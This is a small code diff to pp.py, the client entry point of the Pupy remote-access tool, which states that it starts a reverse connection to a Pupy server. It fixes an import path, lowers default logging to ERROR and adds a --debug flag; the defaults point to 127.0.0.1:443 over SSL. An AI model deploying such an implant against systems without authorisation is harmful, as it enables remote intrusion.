@@ -39,14 +39,14 @@ import random
 import imp
 import argparse
 from network import conf
-from network.base_launcher import LauncherError
+from network.lib.base_launcher import LauncherError
 import logging
 import shlex
 try:
     import additional_imports #additional imports needed to package with pyinstaller
 except ImportError:
     pass
-logging.getLogger().setLevel(logging.DEBUG)
+logging.getLogger().setLevel(logging.ERROR)
 
 LAUNCHER="connect" # the default launcher to start when no argv
 LAUNCHER_ARGS=shlex.split("--host 127.0.0.1:443 --transport ssl") # default launcher arguments
@@ -135,9 +135,12 @@ def main():
 
     if len(sys.argv)>1:
         parser = argparse.ArgumentParser(prog='pp.py', formatter_class=argparse.RawTextHelpFormatter, description="Starts a reverse connection to a Pupy server using the selected launcher\nLast sources: https://github.com/n1nj4sec/pupy\nAuthor: @n1nj4sec (contact@n1nj4.eu)\n")
+        parser.add_argument('--debug', action='store_true', help="increase verbosity")
         parser.add_argument('launcher', choices=[x for x in conf.launchers], help="the launcher to use")
         parser.add_argument('launcher_args', nargs=argparse.REMAINDER, help="launcher arguments")
         args=parser.parse_args()
+        if args.debug:
+            logging.getLogger().setLevel(logging.DEBUG)
         LAUNCHER=args.launcher
         LAUNCHER_ARGS=shlex.split(' '.join(args.launcher_args))
 
